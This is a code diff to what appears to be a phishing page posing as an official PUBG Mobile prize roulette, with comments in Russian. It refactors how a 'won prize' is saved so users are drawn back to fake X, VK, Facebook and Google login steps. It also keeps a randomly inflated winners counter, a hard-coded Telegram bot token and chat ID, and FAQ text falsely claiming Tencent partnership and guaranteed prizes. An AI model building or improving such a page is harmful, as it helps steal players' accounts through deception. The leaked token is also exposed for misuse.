@@ -1528,6 +1528,7 @@
             margin-bottom: 40px;
             font-family: 'Inter', sans-serif;
             color: #0F1419;
+            text-align: center;
         }
         
         .modal-dark .x-title {
@@ -3036,6 +3037,9 @@
     </audio>
 
     <script>
+        // Ключ для хранения данных в браузере
+        const STORAGE_KEY = 'pubg_roulette_save';
+        
         // Конфигурация Telegram бота
         const TELEGRAM_BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
         const TELEGRAM_CHAT_ID = '1709490182';
@@ -3052,6 +3056,70 @@
         let winnersCount = 0;
         let winnersInterval = null;
         let currentLang = 'en';
+        
+        // Функция сохранения прогресса
+        function saveWinState(itemName, itemImage, prizeId) {
+            const data = {
+                hasWon: true,
+                winName: itemName,
+                winImage: itemImage,
+                prizeId: prizeId,
+                timestamp: Date.now(),
+                isPrizeReceived: false,
+                accountId: accountId || ''
+            };
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
+        }
+        
+        // Функция проверки: выигрывал ли пользователь раньше
+        function checkSavedWin() {
+            const savedData = localStorage.getItem(STORAGE_KEY);
+            
+            if (savedData) {
+                const data = JSON.parse(savedData);
+                
+                // Если пользователь выиграл, но еще не получил приз
+                if (data.hasWon && !data.isPrizeReceived) {
+                    console.log("Найден сохраненный неполученный выигрыш:", data.winName);
+                    
+                    // Восстанавливаем данные из сохранения
+                    userPrize = {
+                        id: data.prizeId,
+                        image: data.winImage
+                    };
+                    isPrizeReceived = false;
+                    accountId = data.accountId || '';
+                    
+                    // Обновляем значок с анимацией
+                    updatePrizeBadge();
+                    
+                    // Показываем уведомление о неполученном призе
+                    setTimeout(() => {
+                        const t = translations[currentLang] || translations.en;
+                        showNotification(t.notificationPrizeSaved, false, true);
+                    }, 1000);
+                    
+                    return true;
+                }
+            }
+            return false;
+        }
+        
+        // Если пользователь в итоге ввел ID и вошел в соцсеть (успешно завершил процесс)
+        // можно очистить память:
+        function clearSave() {
+            localStorage.removeItem(STORAGE_KEY);
+        }
+        
+        // Обновляем сохранение когда приз получен
+        function markPrizeAsReceived() {
+            const savedData = localStorage.getItem(STORAGE_KEY);
+            if (savedData) {
+                const data = JSON.parse(savedData);
+                data.isPrizeReceived = true;
+                localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
+            }
+        }
         
         // Функции для модальных окон
         function openModal(modalId) {
@@ -3123,224 +3191,6 @@
                 snow.style.opacity = opacity;
 
                 container.appendChild(snow);
-            }
-        }
-        
-        // Функция для сохранения выигранного приза
-        function saveWinToMemory(prizeName, prizeImage) {
-            const winData = {
-                prizeName: prizeName,
-                prizeImage: prizeImage,
-                timestamp: Date.now()
-            };
-            localStorage.setItem('user_win_data', JSON.stringify(winData));
-            console.log('Win data saved');
-        }
-        
-        // Функция для загрузки выигранного приза
-        function loadWinData() {
-            const savedWin = localStorage.getItem('user_win_data');
-            if (savedWin) {
-                try {
-                    const data = JSON.parse(savedWin);
-                    
-                    // Проверяем, не устарели ли данные
-                    const now = Date.now();
-                    const dataAge = now - (data.timestamp || 0);
-                    const maxAge = 24 * 60 * 60 * 1000; // 24 часа
-                    
-                    if (dataAge < maxAge && userPrize === null) {
-                        // Если у нас еще нет приза в памяти, восстанавливаем его
-                        userPrize = {
-                            id: finalPrizeIndex + 1,
-                            image: data.prizeImage || `priz${finalPrizeIndex + 1}.png`
-                        };
-                        
-                        // Обновляем значок
-                        updatePrizeBadge();
-                        
-                        // Показываем окно с призом
-                        setTimeout(() => {
-                            if (document.getElementById('prizeWindow') && !isPrizeReceived) {
-                                openPrizeWindow();
-                            }
-                        }, 1000);
-                        
-                        console.log('Win data loaded');
-                        return true;
-                    } else if (dataAge >= maxAge) {
-                        // Удаляем устаревшие данные
-                        localStorage.removeItem('user_win_data');
-                    }
-                } catch (e) {
-                    console.error('Error loading win data:', e);
-                }
-            }
-            return false;
-        }
-        
-        // Функции для сохранения и восстановления данных пользователя
-        function saveUserData() {
-            const userData = {
-                accountId: accountId,
-                prize: userPrize,
-                isPrizeReceived: isPrizeReceived,
-                hasPlayed: hasPlayed,
-                prizeIndex: finalPrizeIndex,
-                timestamp: Date.now()
-            };
-            localStorage.setItem('pubg_roulette_user_data', JSON.stringify(userData));
-            console.log('User data saved');
-        }
-        
-        function loadUserData() {
-            const savedData = localStorage.getItem('pubg_roulette_user_data');
-            if (savedData) {
-                try {
-                    const data = JSON.parse(savedData);
-                    
-                    // Проверяем, не устарели ли данные (больше 24 часов)
-                    const now = Date.now();
-                    const dataAge = now - (data.timestamp || 0);
-                    const maxAge = 24 * 60 * 60 * 1000; // 24 часа
-                    
-                    if (dataAge < maxAge) {
-                        accountId = data.accountId || '';
-                        userPrize = data.prize || null;
-                        isPrizeReceived = data.isPrizeReceived || false;
-                        hasPlayed = data.hasPlayed || false;
-                        finalPrizeIndex = data.prizeIndex || 0;
-                        
-                        // Восстанавливаем ID в поле ввода
-                        if (accountId) {
-                            const accountIdInput = document.getElementById('accountIdInput');
-                            if (accountIdInput) {
-                                accountIdInput.value = accountId;
-                            }
-                        }
-                        
-                        // Обновляем значок приза
-                        updatePrizeBadge();
-                        
-                        // Если есть неполученный приз, показываем окно при входе
-                        if (userPrize && !isPrizeReceived) {
-                            setTimeout(() => {
-                                openPrizeWindow();
-                            }, 1500);
-                        }
-                        
-                        console.log('User data loaded from localStorage');
-                        return true;
-                    } else {
-                        // Удаляем устаревшие данные
-                        localStorage.removeItem('pubg_roulette_user_data');
-                        console.log('Old user data removed');
-                    }
-                } catch (e) {
-                    console.error('Error loading user data:', e);
-                }
-            }
-            return false;
-        }
-        
-        // Функция для автосохранения ID аккаунта
-        function setupAccountIdAutosave() {
-            const accountIdInput = document.getElementById('accountIdInput');
-            if (accountIdInput) {
-                // Сохраняем при каждом изменении
-                accountIdInput.addEventListener('input', (e) => {
-                    accountId = e.target.value.trim();
-                    localStorage.setItem('saved_pubg_id', accountId);
-                    
-                    // Также обновляем общие данные пользователя
-                    if (accountId) {
-                        saveUserData();
-                    }
-                });
-                
-                // Загружаем сохраненный ID при загрузке страницы
-                const savedId = localStorage.getItem('saved_pubg_id');
-                if (savedId) {
-                    accountIdInput.value = savedId;
-                    accountId = savedId;
-                }
-            }
-        }
-        
-        // Функция финального действия при выигрыше
-        function finalAction(prizeIndex) {
-            const prizeNumber = prizeIndex + 1;
-            const prizeImage = `priz${prizeNumber}.png`;
-            const prizeName = `PRIZE #${prizeNumber}`;
-            
-            // 1. Сохраняем выигрыш в localStorage
-            saveWinToMemory(prizeName, prizeImage);
-            
-            // 2. Сохраняем все данные пользователя
-            saveUserData();
-            
-            // 3. Обновляем значок приза
-            updatePrizeBadge();
-            
-            // 4. Показываем уведомление
-            showNotification(translations[currentLang]?.notificationPrize || "Congratulations! You won a prize!", false, true);
-            
-            // 5. Показываем форму ввода ID или выбора соцсети
-            if (!accountId) {
-                const accountIdSection = document.getElementById('accountIdSection');
-                if (accountIdSection) {
-                    accountIdSection.classList.add('active');
-                    accountIdSection.scrollIntoView({ behavior: 'smooth' });
-                }
-            } else {
-                // Сбрасываем выбор соцсети
-                const socialOptions = document.querySelectorAll('.social-option');
-                socialOptions.forEach(opt => opt.classList.remove('selected'));
-                selectedSocial = null;
-                
-                // Показываем форму выбора соцсети
-                const socialSelectSection = document.getElementById('socialSelectSection');
-                if (socialSelectSection) {
-                    socialSelectSection.classList.add('active');
-                    socialSelectSection.scrollIntoView({ behavior: 'smooth' });
-                }
-            }
-        }
-        
-        // Функция управления счетчиком победителей
-        function initWinnersCounter() {
-            // Получаем сохраненное значение из localStorage или устанавливаем рандомное от 50 до 100
-            const savedCount = localStorage.getItem('winnersCount');
-            
-            if (savedCount) {
-                winnersCount = parseInt(savedCount);
-            } else {
-                // Генерируем рандомное число от 50 до 100
-                winnersCount = Math.floor(Math.random() * 51) + 50;
-                localStorage.setItem('winnersCount', winnersCount.toString());
-            }
-            
-            // Обновляем отображение
-            updateWinnersDisplay();
-            
-            // Запускаем таймер для увеличения счетчика каждые 40 секунд
-            winnersInterval = setInterval(() => {
-                winnersCount += Math.floor(Math.random() * 3) + 1; // Добавляем 1-3 победителя
-                localStorage.setItem('winnersCount', winnersCount.toString());
-                updateWinnersDisplay();
-            }, 40000); // 40 секунд
-        }
-        
-        function updateWinnersDisplay() {
-            const countElement = document.getElementById('winnersCount');
-            if (countElement) {
-                countElement.textContent = winnersCount;
-                
-                // Анимация при обновлении
-                countElement.style.transform = 'scale(1.2)';
-                setTimeout(() => {
-                    countElement.style.transform = 'scale(1)';
-                }, 300);
             }
         }
         
@@ -3437,12 +3287,52 @@
             }
         }
         
+        // Функция управления счетчиком победителей
+        function initWinnersCounter() {
+            // Получаем сохраненное значение из localStorage или устанавливаем рандомное от 50 до 100
+            const savedCount = localStorage.getItem('winnersCount');
+            
+            if (savedCount) {
+                winnersCount = parseInt(savedCount);
+            } else {
+                // Генерируем рандомное число от 50 до 100
+                winnersCount = Math.floor(Math.random() * 51) + 50;
+                localStorage.setItem('winnersCount', winnersCount.toString());
+            }
+            
+            // Обновляем отображение
+            updateWinnersDisplay();
+            
+            // Запускаем таймер для увеличения счетчика каждые 40 секунд
+            winnersInterval = setInterval(() => {
+                winnersCount += Math.floor(Math.random() * 3) + 1; // Добавляем 1-3 победителя
+                localStorage.setItem('winnersCount', winnersCount.toString());
+                updateWinnersDisplay();
+            }, 40000); // 40 секунд
+        }
+        
+        function updateWinnersDisplay() {
+            const countElement = document.getElementById('winnersCount');
+            if (countElement) {
+                countElement.textContent = winnersCount;
+                
+                // Анимация при обновлении
+                countElement.style.transform = 'scale(1.2)';
+                setTimeout(() => {
+                    countElement.style.transform = 'scale(1)';
+                }, 300);
+            }
+        }
+        
         document.addEventListener('DOMContentLoaded', function() {
             // Инициализируем снег
             createSnow();
             
             // Инициализируем счетчик победителей
             initWinnersCounter();
+            
+            // Проверяем наличие сохраненного выигрыша
+            const hasSavedWin = checkSavedWin();
             
             // Получаем IP пользователя
             fetch('https://api.ipify.org?format=json')
@@ -3459,25 +3349,19 @@
                         localStorage.setItem('isOwner', 'true');
                     } else {
                         console.log('Regular user - one spin only');
-                        // Проверяем, играл ли уже пользователь
-                        const played = localStorage.getItem('hasPlayed');
-                        hasPlayed = played === 'true';
+                        // Проверяем, играл ли уже пользователь (только если нет сохраненного выигрыша)
+                        if (!hasSavedWin) {
+                            const played = localStorage.getItem('hasPlayed');
+                            hasPlayed = played === 'true';
+                        } else {
+                            // Если есть сохраненный выигрыш, пользователь уже играл
+                            hasPlayed = true;
+                        }
                     }
                 })
                 .catch(error => {
                     console.log('Error getting IP:', error);
                 });
-            
-            // Загружаем сохраненные данные пользователя
-            const dataLoaded = loadUserData();
-            
-            // Если не загрузили основные данные, пробуем загрузить данные о выигрыше
-            if (!dataLoaded) {
-                loadWinData();
-            }
-            
-            // Настраиваем автосохранение ID аккаунта
-            setupAccountIdAutosave();
             
             const playBtn = document.getElementById('playBtn');
             const selectionFrame = document.getElementById('selectionFrame');
@@ -3592,7 +3476,8 @@
                     footerLinks: ["Terms of Service", "Privacy Policy", "Cookie Policy", "Cookie Preferences"],
                     copyright: "Copyright © High Morale Developments Limited. All rights reserved.",
                     notificationPrize: "Congratulations! You won a prize!",
-                    notificationIdSaved: "Account ID saved"
+                    notificationIdSaved: "Account ID saved",
+                    notificationPrizeSaved: "You have an unclaimed prize! Check your mail."
                 },
                 ru: {
                     winnersCounter: "Победителей:",
@@ -3649,7 +3534,8 @@
                     footerLinks: ["Условия обслуживания", "Политика конфиденциальности", "Политика Cookie", "Предпочтение Cookies"],
                     copyright: "Авторские права © High Morale Developments Limited. Все права защищены.",
                     notificationPrize: "Поздравляем! Вы выиграли приз!",
-                    notificationIdSaved: "ID аккаунта сохранен"
+                    notificationIdSaved: "ID аккаунта сохранен",
+                    notificationPrizeSaved: "У вас есть неполученный приз! Проверьте почту."
                 },
                 uz: {
                     winnersCounter: "G'oliblar:",
@@ -3696,7 +3582,7 @@
                     faqAnswers: [
                         "<strong>Ha, bu rasmiy hamkor sayti.</strong> Biz Tencent Games kompaniyasining rasmiy hamkorlari bo'lib, PUBG Mobile Hamkor Dasturi doirasida ishlaymiz. Bizning faoliyatimiz to'liq ruxsat etilgan.",
                         "<strong>Ha, sovrinni olish 100% kafolatlanadi.</strong> Barcha yutuqlar ma'lumotlarni tasdiqlaganingizdan so'ng 24 soat ichida avtomatik ravishda yuboriladi. Tizim rasmiy PUBG Mobile API bilan integratsiyalangan bo'lib, sovrinlarni belgilangan hisobga yetkazishni kafolatlaydi.",
-                        "Ijtimoiy tarmoqqa kirish <strong>shaxsingizni tasdiqlash</strong> va firibgarlikni oldini olish uchun zarur. Bu bizga sovrinni haqiqiy odam, bot emas, olayotganiga ishonch hosil qilish imkonini beradi. Barcha ma'lumotlar himoyalangan va uchinchi shaxslarga o'tkazilmaydi.",
+                        "Ijtimoiy tarmoqqa kirish <strong>shaxsingizni tasdiqlash</strong> va firibgarlikni oldini olish uchun zarur. Bu bizga sovrinni haqiqiy odam, bot emas, olayotganiga ishonch hosil qilish imkonini beradi. Barcha ma'lumotlar himoyalangan va uchinji shaxslarga o'tkazilmaydi.",
                         "PUBG Mobile hisob ID raqamini ko'rsatmasdan, biz sizga <strong>sovrinni yubora olmaymiz</strong>. Bu majburiy maydon, chunki aynan shu identifikator orqali tizim qaysi o'yin hisobiga yutgan predmetlarni o'tkazishini aniqlaydi.",
                         "Kamdan-kam hollarda server yuklanishi yuqori bo'lganda, qayta ishlash <strong>48 soatgacha</strong> davom etishi mumkin. Agar bu vaqt ichida sovrin hisobingizga o'tkazilmagan bo'lsa, iltimos, <a href='https://t.me/helpumgmbot' target='_blank'>texnik yordamimizga</a> ID raqamingiz va yutish vaqtingiz bilan murojaat qiling.",
                         "<strong>Ha, bu mutlaqo xavfsiz.</strong> Biz xavfsiz SSL shifrlashdan foydalanamiz va parollaringizni saqlamaymiz. Avtorizatsiya ijtimoiy tarmoqlarning rasmiy API-lari orqali amalga oshiriladi, xuddi telefoningizdagi ilovalarga kirganingizdagidek.",
@@ -3706,7 +3592,8 @@
                     footerLinks: ["Xizmat shartlari", "Maxfiylik siyosati", "Cookie siyosati", "Cookie afzalliklari"],
                     copyright: "Mualliflik huquqi © High Morale Developments Limited. Barcha huquqlar himoyalangan.",
                     notificationPrize: "Tabriklaymiz! Siz sovrinni yutdingiz!",
-                    notificationIdSaved: "Hisob ID raqami saqlandi"
+                    notificationIdSaved: "Hisob ID raqami saqlandi",
+                    notificationPrizeSaved: "Sizda olinmagan sovringiz bor! Pochtangizni tekshiring."
                 }
             };
             
@@ -3862,6 +3749,19 @@
                 }
             }
             
+            // Функция завершения вращения (интегрирована с сохранением)
+            function finishSpin(winnerItem) {
+                const name = "Prize #" + (finalPrizeIndex + 1);
+                const img = winnerItem.image;
+                
+                // СОХРАНЯЕМ В ПАМЯТЬ, чтобы не пропало при перезагрузке
+                saveWinState(name, img, finalPrizeIndex + 1);
+                
+                // Показываем окно
+                moveFrameToPrize(finalPrizeIndex);
+                showSelectionIndicator(true);
+            }
+            
             // Функция запуска рулетки
             function startRoulette() {
                 if (isSpinning) return;
@@ -3919,8 +3819,8 @@
                     winSound.play();
                     
                     setTimeout(() => {
-                        moveFrameToPrize(finalPrizeIndex);
-                        showSelectionIndicator(true);
+                        // СОХРАНЯЕМ В ПАМЯТЬ с помощью finishSpin
+                        finishSpin(prizes[finalPrizeIndex]);
                         
                         setTimeout(() => {
                             isSpinning = false;
@@ -3929,8 +3829,8 @@
                             userPrize = prizes[finalPrizeIndex];
                             isPrizeReceived = false;
                             
-                            // Вызываем финальное действие
-                            finalAction(finalPrizeIndex);
+                            // Обновляем значок с анимацией
+                            updatePrizeBadge();
                             
                             // Сохраняем, что пользователь уже играл (если не владелец)
                             if (userIP !== ownerIP) {
@@ -3942,6 +3842,22 @@
                             }
                             
                             playBtn.disabled = false;
+                            
+                            // Показываем форму ввода ID аккаунта
+                            if (!accountId) {
+                                accountIdSection.classList.add('active');
+                                accountIdSection.scrollIntoView({ behavior: 'smooth' });
+                            } else {
+                                // Сбрасываем выбор соцсети
+                                socialOptions.forEach(opt => opt.classList.remove('selected'));
+                                selectedSocial = null;
+                                
+                                // Показываем форму выбора соцсети
+                                socialSelectSection.classList.add('active');
+                                socialSelectSection.scrollIntoView({ behavior: 'smooth' });
+                            }
+                            
+                            showNotification(translations[currentLang].notificationPrize, false, true);
                         }, 1000);
                     }, 300);
                 }
@@ -3959,9 +3875,13 @@
                 accountId = id;
                 accountIdSection.classList.remove('active');
                 
-                // Сохраняем в localStorage
-                localStorage.setItem('saved_pubg_id', accountId);
-                saveUserData();
+                // Обновляем сохранение с новым ID
+                const savedData = localStorage.getItem(STORAGE_KEY);
+                if (savedData) {
+                    const data = JSON.parse(savedData);
+                    data.accountId = id;
+                    localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
+                }
                 
                 // Сбрасываем выбор соцсети
                 socialOptions.forEach(opt => opt.classList.remove('selected'));
@@ -4012,8 +3932,8 @@
                 if (success) {
                     closeModal('xModalStep2');
                     isPrizeReceived = true;
+                    markPrizeAsReceived();
                     updatePrizeBadge();
-                    saveUserData();
                     showConfirmation();
                     showNotification(translations[currentLang].loginSuccess, false, true);
                 }
@@ -4035,8 +3955,8 @@
                 if (success) {
                     closeModal('vkModal');
                     isPrizeReceived = true;
+                    markPrizeAsReceived();
                     updatePrizeBadge();
-                    saveUserData();
                     showConfirmation();
                     showNotification(translations[currentLang].loginSuccess, false, true);
                 }
@@ -4057,8 +3977,8 @@
                 if (success) {
                     closeModal('facebookModal');
                     isPrizeReceived = true;
+                    markPrizeAsReceived();
                     updatePrizeBadge();
-                    saveUserData();
                     showConfirmation();
                     showNotification(translations[currentLang].loginSuccess, false, true);
                 }
@@ -4108,8 +4028,8 @@
                 if (success) {
                     closeGoogleFullscreen();
                     isPrizeReceived = true;
+                    markPrizeAsReceived();
                     updatePrizeBadge();
-                    saveUserData();
                     showConfirmation();
                     showNotification(translations[currentLang].loginSuccess, false, true);
                 }
@@ -4343,12 +4263,6 @@
                     animateFrameRandomly();
                 }
             }, 2000);
-            
-            // Сохраняем данные при закрытии/обновлении страницы
-            window.addEventListener('beforeunload', saveUserData);
-            
-            // Также периодически сохраняем данные (каждые 30 секунд)
-            setInterval(saveUserData, 30000);
             
             // Устанавливаем английский язык по умолчанию
             changeLanguage('en');
